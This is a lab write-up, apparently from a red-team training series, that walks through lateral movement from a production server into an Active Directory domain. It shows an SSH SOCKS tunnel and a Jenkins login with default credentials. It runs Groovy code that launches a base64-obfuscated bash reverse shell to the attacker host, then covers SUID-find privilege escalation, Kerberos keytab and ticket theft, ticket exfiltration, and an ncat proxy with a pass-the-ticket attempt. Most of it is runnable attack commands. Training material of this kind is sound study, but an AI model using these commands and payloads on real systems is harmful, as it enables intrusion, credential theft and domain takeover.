# Lateral Movement - 1

- [Lateral Movement - 1](#lateral-movement---1)
  - [SSH Tunnel](#ssh-tunnel)
  - [nmap scanning](#nmap-scanning)
  - [Jenkins](#jenkins)
  - [Local Enumeration](#local-enumeration)
  - [Domain Enumeration on Linux](#domain-enumeration-on-linux)
  - [Privilege Escalation to support](#privilege-escalation-to-support)
  - [Requests using support keytab](#requests-using-support-keytab)
  - [Setting Jenkin server as HTTP SOCKS Proxy](#setting-jenkin-server-as-http-socks-proxy)
  - [Pass-the-Ticket](#pass-the-ticket)

---

## SSH Tunnel

Since we have the ssh credential of `iyer`, and we know there is a connection between the Production-Server and an internal address `10.1.3.1`, we can try to reach it via ssh tunnel.

First check out proxychain setting:

```
cat /etc/proxychains.conf | grep 9050
```

Then ssh to `192.168.3.8` using the follow command:

```
ssh -N -D 9050 iyer@192.168.8.3 
```

<br/>

## nmap scanning

First get a standalone version of nmap to the Production-Server.

(Source: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

<br/>

Host the binary on the attacker machine using python3:

```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
python3 -m http.server 80
```

<br/>

Then on Production-Server, download nmap and run the scan:

```
cd /tmp
wget http://192,168.100.11/nmap
chmod +x ./nmap
./nmap -n -Pn -T4 10.1.3.1 -p-
```

![picture 28](images/953b40f002ea08a33026d86d3602be7741c3c24e818c141a098f5b03e969aa6c.png)  

As shown, tcp/1234 is opened on 10.1.3.1.

<br/>

Try to access via proxychain:

![picture 29](images/72cffca4a25e0c6a562f46fc594812d68e715e63d3eb49596cdc6e6597aa5a5c.png)  

<br/>

![picture 30](images/10ced91b8884f83fe802f96af6299b9f49204df93768d0a117ddf0c12461e0c3.png)  

Jenkins, a CI/CD server, is found to be running.

<br/>

---

## Jenkins

Try using admin/admin to login and it is successful.

![picture 31](images/86d2f75518a288b230ca35c19fb279339cfac6e317161f286e2305b6e78ec55c.png)  

<br/>

Create a new job named **Admin Build**:

![picture 32](images/993982da77455ded0c5cea3a1240284a66129fa5754273c7ba569adbf7503786.png)  

<br/>

![picture 33](images/d7f3884f2e2c2196b4f80cd91fbf3b580180f7f28323a6733fc0fc4460cffeef.png)  

<br/>

However, we have no permission to do so. Further checking the available users, there is a user called `autoadmin`:

![picture 34](images/f6b8304efb485cabdd80075f9dae9dd81f566c5b386a8c7b97030ed8eb1c3a8b.png)  

<br/>

Checking `http://10.1.3.1:1234/credentials/`, a cleartext credential is found:

![picture 35](images/4e7ca41d49bce063adf3f6f580e41e196694cb798ea0e0a248b0a7ccc88fc0c2.png)  

<br/>

> Credential:
> 
> autoadmin / Jenk!nsADMIN

<br/>

Login as autoadmin:

![picture 36](images/5424d7a74988b961ffb88b13b0efd85e3e58aaaf5c3f24473f001562eceef49b.png)  

<br/>

Use the Jenkins script function on `http://10.1.3.1:1234/script` in attempt to get a reverse shell (launch a netcat listener on the attacker machine first):

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMS80NDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

<br/>

Note the original of the base64 encoded command:

```
bash -c 'bash -i >& /dev/tcp/192.168.100.11/443 0>&1'
```

![picture 38](images/9f19d0c598d2454b80d8510af49e927bc13a84187a62d729f7f40b37747fda30.png)  


<br/>

A reverse shell calls back:

![picture 39](images/6466e37d44b9491d5d2c7dbe96592a82f4f654c78c06ab99575a9d839aed4cc5.png)  


<br/>

Spawn a PTY shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<br/>

---

## Local Enumeration

Checking the `/home` directory, it looks like the `Automation-Server` is a domain joined computer.

![picture 40](images/d27bd8889c9bdfb44583f8c2213ffc15136af0e10860419a5b4ef6367da13c40.png)  

<br/>

Inspecting `/home/autoadmin/Desktop/ssu_auto.sh`, a cleartext credential of `webadmin` is found, but it is not a valid password.

![picture 41](images/0bf9f3b46ea85aede94afe32b4c94b1fdd63cba1f1021f1d3501531c4e1962f9.png)  

![picture 42](images/cc17f0383e3ded933fe69842b8f381026e447554c591913966e0b898c1e6dfb6.png)  


<br/>

Checking `/home/autoadmin/Downloads`, there are some interesting files and folders:

![picture 43](images/4c7c1b39da877e61e36f54a9093ad0f816627cecd072ee56a433545e3fa05ae5.png)  

<br/>

---

## Domain Enumeration on Linux

To confirm it is a domain-joined computer, we can find `.keytab` file:

```
find / -name *.keytab -type f 2>/dev/null
```

![picture 44](images/00f51dffc6841fe19ac8c9eabd479d2f4566d2f3728e15ed41f29e8623175424.png)  

<br/>

As shown, `/etc/krb5.keytab` exists and it is likely that this machine is domain-joined.

<br/>

Enumerate binaries with SUID bit set:

```
find / -perm -u=s -type f 2>/dev/null
```

![picture 45](images/8db416a40a4ae117fc48dedf6b28d6b49a94983e4c3fd239dac9e0ef4085c24b.png)  

![picture 46](images/c78ccf52d05f8854546b27edf7b4254e614d5c56981b048eba16d9ac0943ee11.png)  

<br/>

Try to use this `find` binary to enumerate other `keytab` file:

```
/var/lib/jenkins/find / -name *.keytab -type f 2>/dev/null
```

![picture 47](images/26b78d2ae53e9f14f58a3e344ad6d7edb7025bf4ce80539708e4fe88c9978df8.png)  

<br/>

As shown, there is a keytab file in the path `/home/support@operations.atomic.site/adm_domain.keytab`

<br/>

----

## Privilege Escalation to support

Since a `find` with SUID is found, we can use it to escalate our privilege.


```
/var/lib/jenkins/find . -exec /bin/bash -p \;
```
![picture 48](images/b78c4c2786c205f2d766ec1e7335a01ac5dc7e42cdbd16ff7d4c82c649a9132f.png)  

As shown, we become the support user in the domain.

<br/>

---

## Requests using support keytab

In the previous section, we identified `/home/support@operations.atomic.site/adm_domain.keytab`. Deduced from the name, it is possible to be the `Domain Admin` keytab file (Domain: operations.atomic.site).

<br/>

With the keytab file, we can request for TGT:

```
cd /home/support\@operations.atomic.site/
```


```
kinit adm_domain@OPERATIONS.ATOMIC.SITE -k -t adm_domain.keytab
```
* Note that the `@` part should be in CAPITAL LETTERS.

![picture 49](images/6b57b5a935649c37c2e83a3124b4106837e2fc8be6cbad0194d6b4d513363d22.png)  


<br/>

Check the IP address of `operations.atomic.site` using `nslookup`:

```
nslookup OPERATIONS.ATOMIC.SITE
```
![picture 50](images/4e7b8e5eba5c37abbf21fd6b23d95a5917b1d8fbdd7a8e57b0ce6ff2267ef4e1.png)  
- 10.1.1.2

<br/>

To get the ComputerName of the DC, we can use check the LDAP record:

```
nslookup -type=any _ldap._tcp.dc._msdcs.operations.atomic.site
```

![picture 51](images/0b3122f70eb0d0537c34a157a60a700d36499acdd1ac987e04a6ac523b46b463.png)  

* As shown, the ComputerName is **OPS-CHILDDC**

<br/>

Then, request a TGS for CIFS:

```
kvno CIFS\/OPS-CHILDDC
klist
```

![picture 52](images/5ab2be853a3ccbc71e40958f387c717fcd41585d341ebd3b18b4a683cee993ce.png)  

<br/>

To transfer the TGS to the attacker machine, first base64 encode the TGS:

```
base64 -w 0 < /tmp/krb5cc_123
```

![picture 53](images/2594f671853d85af70863eaf1a93f928483c7a9d26bf8b2800809361d4063d3d.png)  

<br/>

Then copy the output string and decode in the attacker machine:

```
echo -n "<copied string>" | base64 -d > krb5cc_123
```

![picture 54](images/ce75f8f42ad0d2b9db43ba1f9e0e0733befd421bebb7787ef5dda1bb0600d2d1.png)  


<br/>

## Setting Jenkin server as HTTP SOCKS Proxy

First download `ncat` on Kali Linux:

```
wget https://github.com/ZephrFish/static-tools/raw/master/ncat
``` 

<br/>

Serve `ncat` on the current directory using python http.server:

```
python3 -m http.server 80
```

![picture 6](images/e6b1a9dac987e11af73d111897df45a63d29a11cbbd46ed4724031460265fd31.png)  

<br/>

Then on the Jenkin machine, download the served `ncat`:

```
wget http://192.168.100.11/ncat
```

![picture 7](images/adc8f705ccec32b48462b787c4d60278fe99610c5313200d5cbd56b2e653b9a3.png)  

<br/>

Use `ncat` to setup a http socks proxy:

```
chmod +x ncat
```

```
./ncat -l 4444 --proxy-type http &
```

![picture 8](images/4e38b7d8a6220cf618550220cd9f5763e090e4bf35e16aa1da2c04648d20e7d6.png)  

<br/>

Then do a reverse port forwarding using the tunnel on the Jenkins machine:
```
ssh -R 4445:127.0.0.1:4444 brian@192.168.100.11
```
![picture 9](images/6854041dabbd37e6a221ff5fe47908ffe585c5bbeb25ee8cd48ddd76b1f1582a.png)  

<br/>

Now check the listening ports on the attacker machine using `netstat`:

```
netstat -antup | grep 4445
```

![picture 10](images/169782a784c91c2a340e63747d62f593caf7f85d565fabd216929d163153578c.png)  

<br/>

Then change the http socks port in  `/etc/proxychains.conf`:
![picture 12](images/e6ec86dfb4b64730a2e324c99c720a7f3f6ca780e1db4cc01356344fae60ace8.png)  
 

<br/>

## Pass-the-Ticket

To use krb ticket, first install the following package:

```
apt install -y krb5-user
```

<br/>

Then use impacket to pass-the-ticket:

```
export KRB5CCNAME=./krb5cc_123
```

```
echo "10.1.1.2 OPS-CHILDDC" >> /etc/hosts
```

```
proxychains psexec.py -k -no-pass -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
```

<br/>

However, it is not successful. A possible reason is the time difference of the attacker machine and the target is greater than 15 minutes.

![picture 13](images/618dc3ec3107fc274218c7a51a1a24207f8e7b1f48cef5666e46ba0462c08e96.png)  

